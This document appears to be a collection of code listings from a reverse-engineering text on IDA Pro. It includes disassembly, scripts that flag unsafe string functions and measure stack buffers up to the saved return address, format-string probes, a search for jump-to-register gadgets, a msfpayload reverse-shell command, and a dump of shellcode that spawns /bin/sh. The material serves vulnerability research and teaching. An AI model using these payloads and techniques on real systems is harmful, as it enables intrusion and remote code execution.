__stdcall GetCurrentThread()\nUPX0:0040627C GetCurrentThread dd 7C8098EBh       ; DATA XREF: j_GetCurrentThread↑r\n```", "```\nx86emu: Heap Status ---\n   0x5378000-0x53781ff (0x200 bytes)\n   0x5378204-0x5378217 (0x14 bytes)\n   0x537821c-0x5378347 (0x12c bytes)\n```", "```\nTheHyper:01013B2F            h_pop.l       R9\nTheHyper:01013B32              h_pop.l       R7\nTheHyper:01013B35              h_pop.l       R5\nTheHyper:01013B38              h_mov.l       SP, R2\nTheHyper:01013B3C              h_sub.l       SP, 0Ch\nTheHyper:01013B44              h_pop.l       R2\nTheHyper:01013B47              h_pop.l       R1\nTheHyper:01013B4A              h_retn        0Ch\nTheHyper:01013B4A sub_1013919  endp\nTheHyper:01013B4A\nTheHyper:01013B4A ; ----------------------------------------------------------\nTheHyper:01013B4D              dd 24242424h\nTheHyper:01013B51              dd 0A9A4285Dh           ; TAG VALUE\nTheHyper:01013B55\nTheHyper:01013B55 ; ============ S U B R O U T I N E =========================\nTheHyper:01013B55\nTheHyper:01013B55 ; Attributes: bp-based frame\nTheHyper:01013B55\nTheHyper:01013B55 sub_1013B55  proc near      ; DATA XREF: TheHyper:0103AF7A?o\nTheHyper:01013B55\nTheHyper:01013B55 var_8        = dword ptr −8\nTheHyper:01013B55 var_4        = dword ptr −4\nTheHyper:01013B55 arg_0        = dword ptr  8\nTheHyper:01013B55 arg_4        = dword ptr  0Ch\nTheHyper:01013B55\nTheHyper:01013B55            push    ebp\nTheHyper:01013B56              mov     ebp, esp\nTheHyper:01013B58              sub     esp, 8\nTheHyper:01013B5B              mov     eax, [ebp+arg_0]\nTheHyper:01013B5E              mov     [esp+8+var_8], eax\nTheHyper:01013B61              mov     [esp+8+var_4], 0\nTheHyper:01013B69              push    4\nTheHyper:01013B6B              push    1000h\n```", "```\n extern:804DECC          extrn strcpy:near     ; CODE XREF: _strcpy↑j\n  extern:804DECC                                ; DATA XREF: .got:off_804D5E4↑o\n```", "```\n.plt:08049E90 _strcpy    proc near               ; CODE XREF: decode+5F↓p\n.plt:08049E90                                    ; extract_int_argument+24↓p ...\n.plt:08049E90            jmp     ds:off_804D5E4\n.plt:08049E90 _strcpy    endp\n```", "```\n.got:0804D5E4 off_804D5E4     dd offset strcpy        ; DATA XREF: _strcpy↑r\n```", "```\nstatic getFuncAddr(fname) {\n   auto func = LocByName(fname);\n   if (func != BADADDR) {\n      auto seg = SegName(func);\n      //what segment did we find it in?\n      if (seg == \"extern\") { //Likely an ELF if we are in \"extern\"\n         //First (and only) data xref should be from got\n         func = DfirstB(func);\n         if (func != BADADDR) {\n            seg = SegName(func);\n            if (seg != \".got\") return BADADDR;\n            //Now, first (and only) data xref should be from plt\n            func = DfirstB(func);\n            if (func != BADADDR) {\n               seg = SegName(func);\n               if (seg != \".plt\") return BADADDR;\n            }\n         }\n      }\n      else if (seg != \".text\") {\n         //otherwise, if the name was not in the .text section, then we\n         // don't have an algorithm for finding it automatically\n         func = BADADDR;\n      }\n   }\n   return func;\n}\n```", "```\nstatic flagCalls(fname) {\n     auto func, xref;\n     //get the callable address of the named function\n    func = getFuncAddr(fname);\n     if (func != BADADDR) {\n        //Iterate through calls to the named function, and add a comment\n        //at each call\n       for (xref\n = RfirstB(func); xref != BADADDR; xref = RnextB(func, xref)) {\n           if (XrefType() == fl_CN || XrefType() == fl_CF) {\n              MakeComm(xref, \"*** AUDIT HERE ***\");\n           }\n        }\n        //Iterate through data references to the named function, and add a\n        //comment at reference\n       for\n (xref = DfirstB(func); xref != BADADDR; xref = DnextB(func, xref)) {\n           if (XrefType() == dr_O) {\n              MakeComm(xref, \"*** AUDIT HERE ***\");\n           }\n        }\n     }\n  }\n```", "```\n .text:000194EA                 mov     esi, ds:strcpy\n  .text:000194F0                 push    offset loc_40A006\n  .text:000194F5                 add     edi, 160h\n    .text:000194FB                 push    edi\n .text:000194FC call    esi\n```", "```\n.text:000194EA                 mov     esi, ds:strcpy\n  .text:000194F0                 push    offset loc_40A006\n  .text:000194F5                 add     edi, 160h\n  .text:000194FB                 push    edi\n .text:000194FC                 call    esi ; strcpy\n```", "```\nstatic main() {\n   flagCalls(\"strcpy\");\n   flagCalls(\"strcat\");\n   flagCalls(\"sprintf\");\n   flagCalls(\"gets\");\n}\n```", "```\ndef findStackBuffers(func_addr, minsize):\n     prev_idx = −1\n     frame = GetFrame(func_addr)\n     if frame == −1: return   #bad function\n       idx = 0\n     prev = None\n     while idx < GetStrucSize(frame):\n       member = GetMemberName(frame, idx)\n        if member is not None:\n           if prev_idx != −1:\n              #compute distance from previous field to current field\n             delta = idx - prev_idx\n             if delta >= minsize:\n                 Message(\"%s: possible buffer %s: %d bytes\\n\" %  \\\n                         (GetFunctionName(func_addr), prev, delta))\n           prev_idx = idx\n           prev = member\n          idx = idx + GetMemberSize(frame, idx)\n        else:\n          idx = idx + 1\n```", "```\n.text:08048B38 sub_8048B38     proc near\n.text:08048B38\n.text:08048B38 var_818         = byte ptr −818h\n.text:08048B38 var_418         = byte ptr −418h\n.text:08048B38 var_C           = dword ptr −0Ch\n.text:08048B38 arg_0           = dword ptr  8\n```", "```\n-00000818 var_818         db ?\n−00000817                 db ? ; undefined\n−00000816                 db ? ; undefined\n...\n−0000041A                 db ? ; undefined\n−00000419                 db ? ; undefined\n−00000418 var_418         db 1036 dup(?)\n−0000000C var_C           dd ?\n```", "```\nsub_8048B38: possible buffer var_818: 1024 bytes\nsub_8048B38: possible buffer var_418: 1036 bytes\n```", "```\nFile Function name Function address Sig      Hash     CRC\n---- ------------- ---------------- ---      ----     ---\n1    sub_7CB25FE9  7CB25FE9         000000F0 F4E7267B 411C3DCC\n1    sub_7CB6814C  7CB6814C         000000F0 F4E7267B 411C3DCC\n2    sub_7CB6819A  7CB6819A         000000F0 F4E7267B 411C3DCC\n2    sub_7CB2706A  7CB2706A         000000F0 F4E7267B 411C3DCC\n```", "```\n−0000009C result          dd ?\n−00000098 buffer_132      db 132 dup(?)           ; this can be overflowed\n−00000014 p_buf           dd ?                    ; pointer into buffer_132\n−00000010 num_bytes       dd ?                    ; bytes read per loop\n−0000000C total_read      dd ?                    ; total bytes read\n−00000008                 db ? ; undefined\n−00000007                 db ? ; undefined\n−00000006                 db ? ; undefined\n−00000005                 db ? ; undefined\n−00000004                 db ? ; undefined\n−00000003                 db ? ; undefined\n−00000002                 db ? ; undefined\n−00000001                 db ? ; undefined\n+00000000  s              db 4 dup(?)\n+00000004  r              db 4 dup(?)             ; save return address\n+00000008 filedes         dd ?                    ; socket descriptor\n```", "```\nfunc = ScreenEA()  #process function at cursor location\n  frame = GetFrame(func)\n  if frame != −1:\n     Message(\"Enumerating stack for %s\\n\" % GetFunctionName(func))\n    eip_loc = GetFrameLvarSize(func) + GetFrameRegsSize(func)\n       prev_idx = −1\n     idx = 0\n     while idx < GetStrucSize(frame):\n        member = GetMemberName(frame, idx)\n        if member is not None:\n           if prev_idx != −1:\n              #compute distance from previous field to current field\n              delta = idx - prev_idx\n              Message(\"%15s: %4d bytes (%4d bytes to eip)\\n\" % \\\n                      (prev, delta, eip_loc - prev_idx))\n           prev_idx = idx\n           prev = member\n           idx = idx + GetMemberSize(frame, idx)\n        else:\n           idx = idx + 1\n     if prev_idx != −1:\n        #make sure we print the last field in the frame\n        delta = GetStrucSize(frame) - prev_idx\n        Message(\"%15s: %4d bytes (%4d bytes to eip)\\n\" % \\\n                (prev, delta, eip_loc - prev_idx))\n```", "```\nEnumerating stack for handleSocket\n         result:    4 bytes ( 160 bytes to eip)\n     buffer_132:  132 bytes ( 156 bytes to eip)\n          p_buf:    4 bytes (  24 bytes to eip)\n      num_bytes:    4 bytes (  20 bytes to eip)\n     total_read:   12 bytes (  16 bytes to eip)\n              s:    4 bytes (   4 bytes to eip)\n              r:    4 bytes (   0 bytes to eip)\n         fildes:    4 bytes (  −4 bytes to eip)\n```", "```\n.text:080488CA        lea     eax, [ebp+format]\n  .text:080488D0        mov     [esp+4], eax    ; format\n   .text:080488D4        mov     eax, [ebp+stream]\n  .text:080488DA        mov     [esp], eax      ; stream\n   .text:080488DD        call    _fprintf\n```", "```\n  −00000128                 db ? ; undefined\n   −00000127                 db ? ; undefined\n   −00000126                 db ? ; undefined\n   −00000125                 db ? ; undefined\n  −00000124                 db ? ; undefined\n   −00000123                 db ? ; undefined\n   −00000122                 db ? ; undefined\n   −00000121                 db ? ; undefined\n   −00000120                 db ? ; undefined\n   −0000011F                 db ? ; undefined\n   −0000011E                 db ? ; undefined\n   −0000011D                 db ? ; undefined\n   −0000011C                 db ? ; undefined\n   −0000011B                 db ? ; undefined\n   −0000011A                 db ? ; undefined\n   −00000119                 db ? ; undefined\n   −00000118 s1              dd ?                    ; offset\n   −00000114 stream          dd ?                    ; offset\n   −00000110 format          db 264 dup(?)\n```", "```\n\"%x %x %x %x %x\"\n```", "```\n\"%5$x\"\n```", "```\n.text:080486CD B8 FF FF E4 34                 mov     eax, 34E4FFFFh\n```", "```\nea = FindBinary(MinEA(), SEARCH_DOWN | SEARCH_CASE, \"FF E4\");\n```", "```\nSearching...\nFound jmp edx (FF E2) at 0x80816e6\nFound call edx (FF D2) at 0x8048138\nFound 2 occurrences\n```", "```\nea = ScreenEA()\n   dref = ea\n   for xref in XrefsFrom(ea, 0):\n     if xref.type == fl_CN and SegName(xref.to) == \".plt\":\n        for dref in DataRefsFrom(xref.to):\n            Message(\"GOT entry for %s is at 0x%08x\\n\" %\n                   (GetFunctionName(xref.to), dref))\n            break\n   if ea == dref:\n      Message(\"Sorry this does not appear to be a library function call\\n\")\n```", "```\n.text:080513A8                 call    _memset\n```", "```\nGOT entry for .memset is at 0x080618d8\n```", "```\n# ./msfpayload windows/shell_reverse_tcp LHOST=192.168.15.20 R >\nw32_reverse_4444\n```", "```\n00000000   AD 02 0E 08  01 00 00 00  47 43 4E 93  43 4B 91 90  ........GCN.CK..\n00000010   92 47 4E 46  96 46 41 4A  43 4F 99 41  40 49 48 43  .GNF.FAJCO.A@IHC\n00000020   4A 4E 4B 43  42 49 93 4B  4A 41 47 46  46 46 43 90  JNKCBI.KJAGFFFC.\n00000030   4E 46 97 4A  43 90 42 91  46 90 4E 97  42 48 41 48  NF.JC.B.F.N.BHAH\n00000040   97 93 48 97  93 42 40 4B  99 4A 6A 02  58 CD 80 09  ..H..B@K.Jj.X...\n00000050   D2 75 06 6A  01 58 50 CD  80 33 C0 B4  10 2B E0 31  .u.j.XP..3...+.1\n00000060   D2 52 89 E6  52 52 B2 80  52 B2 04 52  56 52 52 66  .R..RR..R..RVRRf\n00000070   FF 46 E8 6A  1D 58 CD 80  81 3E 48 41  43 4B 75 EF  .F.j.X...>HACKu.\n00000080   5A 5F 6A 02  59 6A 5A 58  99 51 57 51  CD 80 49 79  Z_j.YjZX.QWQ..Iy\n00000090   F4 52 68 2F  2F 73 68 68  2F 62 69 6E  89 E3 50 54  .Rh//shh/bin..PT\n000000A0   53 53 B0 3B  CD 80 41 41  49 47 41 93  97 97 4B 48  SS.;..AAIGA...KH\n```", "```\n  seg000:00000000           db 0ADh ; ¡\n   seg000:00000001           db    2\n   seg000:00000002           db  0Eh\n   seg000:00000003           db    8\n   seg000:00000004           db    1\n   seg000:00000005           db    0\n   seg000:00000006           db    0\n   seg000:00000007           db    0\n   seg000:00000008 ; --------------------------------------------------------------\n   seg000:00000008           inc     edi\n   seg000:00000009           inc     ebx\n   seg000:0000000A           dec     esi\n   ...             ; NOP slide and shellcode initialization omitted\n   seg000:0000006D           push    edx\n   seg000:0000006E           push    edx\n   seg000:0000006F\n   seg000:0000006F loc_6F:                   ; CODE XREF:  seg000:0000007E↓j\n   seg000:0000006F           inc     word ptr [esi-18h]\n   seg000:00000073           push    1Dh\n   seg000:00000075           pop     eax\n  seg000:00000076           int     80h     ; LINUX - sys_pause\n   seg000:00000078           cmp     dword ptr [esi], 4B434148h\n   seg000:0000007E           jnz     short loc_6F\n   seg000:00000080           pop     edx\n   seg000:00000081           pop     edi\n   seg000:00000082           push    2\n   seg000:00000084           pop     ecx\n   seg000:00000085\n   seg000:00000085 loc_85:                   ; CODE XREF:  seg000:0000008F↓j\n   seg000:00000085           push    5Ah ; 'Z'\n   seg000:00000087           pop     eax\n   seg000:00000088           cdq\n   seg000:00000089           push    ecx\n   seg000:0000008A           push    edi\n   seg000:0000008B           push    ecx\n  seg000:0000008C           int     80h     ; LINUX - old_mmap\n   seg000:0000008E           dec     ecx\n   seg000:0000008F           jns     short loc_85\n   seg000:00000091           push    edx\n   seg000:00000092           push    'hs//'\n   seg000:00000097           push    'nib/'\n   ...             ; continues to invoke execve to spawn the shell\n```", "```\nsigned int __cdecl sub_80489B4(int fd)\n{\n  int v1; // eax@1\n  signed int v2; // edx@1\n  char buf; // [sp+4h] [bp-208h]@2\n  char s; // [sp+104h] [bp-108h]@2\n\n  v1 = sub_8048B44(fd, (int)\"Hans Brix? Oh no! Oh,\n herro. Great to see you again, Hans! \", 0);\n  v2 = −1;\n  if ( v1 != −1 )\n  {\n    recv(fd, &buf, 0x100u, 0);\n    snprintf(&s, 0x12Cu, \"Hans Brix says: \\\"%s\\\"\\n\", &buf);\n    sub_8048B44(fd, (int)&s, 0);\n    v2 = 0;\n  }\n  return v2;\n}\n```", "```\nsigned int __cdecl sub_80489B4(int fd)\n{\n  int length; // eax@1\n  signed int error; // edx@1\n  char buf[256]; // [sp+4h] [bp-208h]@2\n  char s[264]; // [sp+104h] [bp-108h]@2\n\n  length = write_string(fd, \"Hans Brix? Oh no! Oh, herro.\n Great to see you again, Hans! \", 0);\n  error = −1;\n  if ( length != −1 )\n  {\n    recv(fd, buf, 256u, 0);\n    snprintf(s, 300u, \"Hans Brix says: \\\"%s\\\"\\n\", buf);\n    write_string(fd, s, 0);\n    error = 0;\n  }\n  return error;\n}\n```", "```\n  Vftable    Method count    Class & structure info\n 0041A298     0003              ChildClass;  [MI]\n 0041A2A8     0003              ChildClass: SuperClass1, SuperClass2;  [MI]\n 0041A2B8     0003              SuperClass1;  [SI]\n 0041A2C8     0003              SuperClass2;  [SI]\n 0041A2D8     0004              BaseClass;  [SI]\n 0041A2EC     0005              SubClass: BaseClass;  [SI]\n```", "```\nNum  Location  Type         Data Offs  Data size\n    Filters         Filtered stream  Filtered size  Ascii\n17   000e20fe  Stream       000e2107      313       /FlateDecode\n    000f4080             210        No\n35   00000010  Dictionary   00000019       66\n                                                       Yes\n36   000002a3  Dictionary   000002ac      122\n                                                       Yes\n37   0000032e  Stream       00000337      470       [/FlateDecode]\n  000f4170             1367       Yes\n```"]